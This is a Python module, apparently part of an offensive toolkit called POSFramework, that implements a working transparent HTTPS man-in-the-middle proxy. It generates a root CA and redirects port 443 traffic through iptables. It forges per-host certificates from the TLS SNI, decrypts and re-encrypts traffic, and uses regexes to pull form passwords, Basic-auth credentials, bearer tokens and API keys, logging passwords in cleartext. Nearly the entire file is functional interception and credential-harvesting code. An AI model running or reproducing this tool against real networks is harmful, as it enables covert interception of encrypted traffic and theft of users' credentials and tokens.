"""
HTTPS Interceptor Module
────────────────────────
Full mitmproxy-style TLS interception with dynamic certificate generation:
  - Generates a CA certificate on initialization (via subprocess openssl)
  - For each intercepted TLS connection, generates a dynamic cert signed by the CA
  - Implements a transparent proxy that terminates TLS, inspects plaintext HTTP,
    then re-encrypts to upstream
  - Extracts credentials from decrypted HTTPS traffic using cred_harvester patterns
"""

import os
import re
import ssl
import time
import socket
import struct
import threading
import subprocess
import tempfile
from collections import defaultdict

from scapy.all import IP, TCP, Raw, sniff

from .config import IS_LINUX, log


class HTTPSInterceptor:
    """
    HTTPS TLS interception engine with dynamic certificate generation.

    Operates as a transparent TLS proxy:
    1. Generates a root CA certificate on init
    2. Sets up iptables to redirect port 443 traffic to our proxy
    3. For each incoming TLS connection, generates a dynamic cert for the SNI hostname
    4. Terminates TLS from client, inspects plaintext HTTP, re-encrypts to upstream
    5. Extracts credentials from decrypted traffic
    """

    def __init__(self, interface, ca_dir=None, listen_port=8443):
        self.interface = interface
        self.listen_port = listen_port
        self.ca_dir = ca_dir or tempfile.mkdtemp(prefix="https_intercept_ca_")
        self.ca_key_path = os.path.join(self.ca_dir, "ca.key")
        self.ca_cert_path = os.path.join(self.ca_dir, "ca.crt")
        self._cert_cache = {}
        self._cert_cache_dir = os.path.join(self.ca_dir, "certs")
        self._running = False
        self._thread = None
        self._server_socket = None
        self._intercepted = []
        self._credentials = []
        self._connections = 0
        self._errors = 0
        self._lock = threading.Lock()

        # Credential extraction patterns
        self._patterns = self._compile_patterns()

        # Generate CA on init
        self._generate_ca()

    def _compile_patterns(self):
        """Compile regex patterns for credential extraction from decrypted traffic."""
        return {
            "http_form_user": re.compile(
                r'(?:username|user|email|login|user_name|uid)[\s]*=[\s]*["\']?([^&"\']+)', re.I
            ),
            "http_form_pass": re.compile(
                r'(?:password|pass|pwd|passwd|pin)[\s]*=[\s]*["\']?([^&"\']+)', re.I
            ),
            "basic_auth": re.compile(r'Authorization:\s*Basic\s+(\S+)', re.I),
            "bearer_token": re.compile(r'Authorization:\s*Bearer\s+(\S+)', re.I),
            "cookie": re.compile(r'Cookie:\s*(.+)', re.I),
            "set_cookie": re.compile(r'Set-Cookie:\s*(.+)', re.I),
            "api_key": re.compile(r'X-API-Key:\s*(\S+)', re.I),
        }

    def _generate_ca(self):
        """Generate a root CA certificate and key using subprocess openssl."""
        os.makedirs(self._cert_cache_dir, exist_ok=True)

        if os.path.exists(self.ca_key_path) and os.path.exists(self.ca_cert_path):
            log.info("CA certificate already exists, reusing")
            return True

        try:
            # Generate CA private key (RSA 2048)
            subprocess.run(
                ["openssl", "genrsa", "-out", self.ca_key_path, "2048"],
                capture_output=True, timeout=30, check=True
            )

            # Generate self-signed CA certificate
            subprocess.run(
                [
                    "openssl", "req", "-new", "-x509",
                    "-key", self.ca_key_path,
                    "-out", self.ca_cert_path,
                    "-days", "3650",
                    "-subj", "/CN=POSFramework Intercept CA/O=POSFramework/C=US"
                ],
                capture_output=True, timeout=30, check=True
            )

            log.info(f"CA certificate generated: {self.ca_cert_path}")
            return True

        except (subprocess.CalledProcessError, FileNotFoundError, OSError) as e:
            log.error(f"Failed to generate CA certificate: {e}")
            return False

    def _generate_host_cert(self, hostname):
        """Generate a dynamic certificate for a specific hostname, signed by our CA."""
        if hostname in self._cert_cache:
            return self._cert_cache[hostname]

        safe_name = re.sub(r'[^a-zA-Z0-9._-]', '_', hostname)
        key_path = os.path.join(self._cert_cache_dir, f"{safe_name}.key")
        cert_path = os.path.join(self._cert_cache_dir, f"{safe_name}.crt")
        csr_path = os.path.join(self._cert_cache_dir, f"{safe_name}.csr")
        ext_path = os.path.join(self._cert_cache_dir, f"{safe_name}.ext")

        try:
            # Generate host private key
            subprocess.run(
                ["openssl", "genrsa", "-out", key_path, "2048"],
                capture_output=True, timeout=30, check=True
            )

            # Generate CSR
            subprocess.run(
                [
                    "openssl", "req", "-new",
                    "-key", key_path,
                    "-out", csr_path,
                    "-subj", f"/CN={hostname}/O=POSFramework Intercept"
                ],
                capture_output=True, timeout=30, check=True
            )

            # Write SAN extension file
            with open(ext_path, "w") as f:
                f.write(f"subjectAltName=DNS:{hostname}\n")
                f.write("basicConstraints=CA:FALSE\n")
                f.write("keyUsage=digitalSignature,keyEncipherment\n")
                f.write("extendedKeyUsage=serverAuth\n")

            # Sign with our CA
            subprocess.run(
                [
                    "openssl", "x509", "-req",
                    "-in", csr_path,
                    "-CA", self.ca_cert_path,
                    "-CAkey", self.ca_key_path,
                    "-CAcreateserial",
                    "-out", cert_path,
                    "-days", "365",
                    "-extfile", ext_path
                ],
                capture_output=True, timeout=30, check=True
            )

            self._cert_cache[hostname] = (cert_path, key_path)
            log.info(f"Generated dynamic cert for: {hostname}")
            return (cert_path, key_path)

        except (subprocess.CalledProcessError, FileNotFoundError, OSError) as e:
            log.error(f"Failed to generate cert for {hostname}: {e}")
            return None

    def _extract_sni(self, data):
        """Extract SNI (Server Name Indication) from TLS ClientHello."""
        try:
            # TLS record: content_type(1) + version(2) + length(2) + handshake
            if len(data) < 5:
                return None
            if data[0] != 0x16:  # Handshake
                return None

            # Handshake message starts at offset 5
            # handshake_type(1) + length(3) + version(2) + random(32) + session_id_len
            offset = 5
            if offset >= len(data):
                return None
            if data[offset] != 0x01:  # ClientHello
                return None

            offset += 4  # Skip handshake type + length
            offset += 2  # Skip client version
            offset += 32  # Skip random

            if offset >= len(data):
                return None

            # Session ID
            session_id_len = data[offset]
            offset += 1 + session_id_len

            if offset + 2 > len(data):
                return None

            # Cipher suites
            cipher_suites_len = struct.unpack("!H", data[offset:offset + 2])[0]
            offset += 2 + cipher_suites_len

            if offset >= len(data):
                return None

            # Compression methods
            comp_methods_len = data[offset]
            offset += 1 + comp_methods_len

            if offset + 2 > len(data):
                return None

            # Extensions
            extensions_len = struct.unpack("!H", data[offset:offset + 2])[0]
            offset += 2

            end = offset + extensions_len
            while offset + 4 < end and offset + 4 < len(data):
                ext_type = struct.unpack("!H", data[offset:offset + 2])[0]
                ext_len = struct.unpack("!H", data[offset + 2:offset + 4])[0]
                offset += 4

                if ext_type == 0x0000:  # SNI extension
                    if offset + 5 < len(data):
                        # SNI list length (2) + type (1) + name length (2) + name
                        sni_list_len = struct.unpack("!H", data[offset:offset + 2])[0]
                        name_type = data[offset + 2]
                        name_len = struct.unpack("!H", data[offset + 3:offset + 5])[0]
                        if name_type == 0 and offset + 5 + name_len <= len(data):
                            return data[offset + 5:offset + 5 + name_len].decode('ascii')
                    return None

                offset += ext_len

        except (IndexError, struct.error, UnicodeDecodeError):
            pass

        return None

    def _setup_iptables(self):
        """Set up iptables to redirect port 443 traffic to our proxy."""
        if not IS_LINUX:
            return
        try:
            subprocess.run(
                [
                    "iptables", "-t", "nat", "-A", "PREROUTING",
                    "-i", self.interface, "-p", "tcp", "--dport", "443",
                    "-j", "REDIRECT", "--to-port", str(self.listen_port)
                ],
                capture_output=True, timeout=5
            )
            log.info(f"iptables REDIRECT: port 443 -> {self.listen_port}")
        except Exception as e:
            log.error(f"iptables setup failed: {e}")

    def _teardown_iptables(self):
        """Remove iptables PREROUTING rule."""
        if not IS_LINUX:
            return
        try:
            subprocess.run(
                [
                    "iptables", "-t", "nat", "-D", "PREROUTING",
                    "-i", self.interface, "-p", "tcp", "--dport", "443",
                    "-j", "REDIRECT", "--to-port", str(self.listen_port)
                ],
                capture_output=True, timeout=5
            )
            log.info("iptables REDIRECT rule for port 443 removed")
        except Exception:
            pass

    def _handle_client(self, client_socket, client_addr):
        """Handle a single intercepted TLS connection."""
        try:
            # Peek at the ClientHello to extract SNI
            client_socket.settimeout(10)
            raw_data = client_socket.recv(4096, socket.MSG_PEEK)
            if not raw_data:
                client_socket.close()
                return

            hostname = self._extract_sni(raw_data)
            if not hostname:
                hostname = "unknown.host"
                log.warning(f"Could not extract SNI from {client_addr}")

            # Generate dynamic cert for this hostname
            cert_info = self._generate_host_cert(hostname)
            if not cert_info:
                client_socket.close()
                return

            cert_path, key_path = cert_info

            # Wrap client socket with TLS using our dynamic cert
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(cert_path, key_path)
            ctx.check_hostname = False

            try:
                tls_client = ctx.wrap_socket(client_socket, server_side=True)
            except ssl.SSLError as e:
                log.debug(f"TLS handshake failed with client {client_addr}: {e}")
                client_socket.close()
                self._errors += 1
                return

            # Read decrypted HTTP request from client
            try:
                request_data = b""
                while True:
                    chunk = tls_client.recv(8192)
                    if not chunk:
                        break
                    request_data += chunk
                    if b"\r\n\r\n" in request_data:
                        break
                    if len(request_data) > 65536:
                        break
            except (ssl.SSLError, socket.timeout, OSError):
                request_data = b""

            if not request_data:
                tls_client.close()
                return

            # Extract credentials from decrypted traffic
            self._inspect_decrypted(request_data, hostname, client_addr[0])

            # Connect to upstream server via TLS
            try:
                upstream_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                upstream_sock.settimeout(15)
                upstream_sock.connect((hostname, 443))

                upstream_ctx = ssl.create_default_context()
                upstream_ctx.check_hostname = True
                upstream_ctx.verify_mode = ssl.CERT_REQUIRED
                upstream_tls = upstream_ctx.wrap_socket(upstream_sock, server_hostname=hostname)

                # Forward request to upstream
                upstream_tls.sendall(request_data)

                # Read response from upstream
                response_data = b""
                while True:
                    try:
                        chunk = upstream_tls.recv(8192)
                        if not chunk:
                            break
                        response_data += chunk
                        if len(response_data) > 2 * 1024 * 1024:
                            break
                    except (ssl.SSLError, socket.timeout):
                        break

                # Inspect response for credentials (Set-Cookie, etc.)
                self._inspect_decrypted(response_data, hostname, "server")

                # Forward response to client
                if response_data:
                    tls_client.sendall(response_data)

                upstream_tls.close()

            except (socket.error, ssl.SSLError, OSError) as e:
                log.warning(f"Upstream connection to {hostname} failed: {e}")
                error_resp = (
                    b"HTTP/1.1 502 Bad Gateway\r\n"
                    b"Content-Type: text/html\r\n"
                    b"Connection: close\r\n\r\n"
                    b"<html><body><h1>502 Bad Gateway</h1></body></html>"
                )
                try:
                    tls_client.sendall(error_resp)
                except Exception:
                    pass

            with self._lock:
                self._connections += 1

            tls_client.close()

        except (socket.error, ssl.SSLError, OSError) as e:
            log.debug(f"Client handling error: {e}")
            self._errors += 1
            try:
                client_socket.close()
            except Exception:
                pass

    def _inspect_decrypted(self, data, hostname, source_ip):
        """Inspect decrypted HTTP data for credentials and sensitive info."""
        try:
            text = data.decode(errors='ignore')
        except Exception:
            return

        record = {
            "hostname": hostname,
            "source": source_ip,
            "timestamp": time.time(),
            "size": len(data),
            "credentials": []
        }

        # Check for form credentials
        user_match = self._patterns["http_form_user"].search(text)
        pass_match = self._patterns["http_form_pass"].search(text)
        if user_match and pass_match:
            cred = {
                "type": "form",
                "username": user_match.group(1),
                "password": pass_match.group(1),
                "hostname": hostname
            }
            record["credentials"].append(cred)
            self._credentials.append(cred)
            log.critical(
                f"HTTPS credential intercepted: {cred['username']}:{cred['password']} "
                f"@ {hostname}"
            )

        # Check for Basic Auth
        auth_match = self._patterns["basic_auth"].search(text)
        if auth_match:
            import base64
            try:
                decoded = base64.b64decode(auth_match.group(1)).decode()
                if ":" in decoded:
                    user, pwd = decoded.split(":", 1)
                    cred = {
                        "type": "basic_auth",
                        "username": user,
                        "password": pwd,
                        "hostname": hostname
                    }
                    record["credentials"].append(cred)
                    self._credentials.append(cred)
            except Exception:
                pass

        # Check for Bearer token
        bearer_match = self._patterns["bearer_token"].search(text)
        if bearer_match:
            cred = {
                "type": "bearer_token",
                "token": bearer_match.group(1),
                "hostname": hostname
            }
            record["credentials"].append(cred)
            self._credentials.append(cred)

        # Check for API Key
        api_key_match = self._patterns["api_key"].search(text)
        if api_key_match:
            cred = {
                "type": "api_key",
                "key": api_key_match.group(1),
                "hostname": hostname
            }
            record["credentials"].append(cred)
            self._credentials.append(cred)

        with self._lock:
            self._intercepted.append(record)

    def _proxy_server_loop(self):
        """Main proxy server accept loop."""
        try:
            self._server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._server_socket.bind(("0.0.0.0", self.listen_port))
            self._server_socket.listen(50)
            self._server_socket.settimeout(1.0)
            log.info(f"HTTPS intercept proxy listening on port {self.listen_port}")

            while self._running:
                try:
                    client_sock, client_addr = self._server_socket.accept()
                    threading.Thread(
                        target=self._handle_client,
                        args=(client_sock, client_addr),
                        daemon=True
                    ).start()
                except socket.timeout:
                    continue
                except OSError:
                    break

        except (OSError, socket.error) as e:
            log.error(f"HTTPS intercept proxy error: {e}")
        finally:
            if self._server_socket:
                try:
                    self._server_socket.close()
                except Exception:
                    pass

    def start(self):
        """Start HTTPS interception."""
        if self._running:
            log.warning("HTTPS interceptor already running")
            return False

        self._running = True

        # Remove any stale iptables rules from a previous crash before adding new ones
        self._teardown_iptables()

        # Set up iptables redirect
        self._setup_iptables()

        # Start proxy server thread
        self._thread = threading.Thread(target=self._proxy_server_loop, daemon=True)
        self._thread.start()

        log.info(f"HTTPS interceptor started on {self.interface} (port {self.listen_port})")
        return True

    def stop(self):
        """Stop HTTPS interception and clean up."""
        self._running = False

        # Teardown iptables
        self._teardown_iptables()

        # Close server socket
        if self._server_socket:
            try:
                self._server_socket.close()
            except Exception:
                pass

        # Wait for thread
        if self._thread:
            self._thread.join(timeout=5)

        log.info("HTTPS interceptor stopped")

    def get_intercepted(self):
        """Return all intercepted connection records."""
        with self._lock:
            return list(self._intercepted)

    def get_credentials(self):
        """Return all extracted credentials."""
        return list(self._credentials)

    def get_ca_cert_path(self):
        """Return the path to the CA certificate (for client installation)."""
        return self.ca_cert_path

    def get_stats(self):
        """Return interception statistics."""
        with self._lock:
            return {
                "running": self._running,
                "connections": self._connections,
                "intercepted_records": len(self._intercepted),
                "credentials_captured": len(self._credentials),
                "cached_certs": len(self._cert_cache),
                "errors": self._errors,
                "listen_port": self.listen_port,
                "ca_cert": self.ca_cert_path
            }
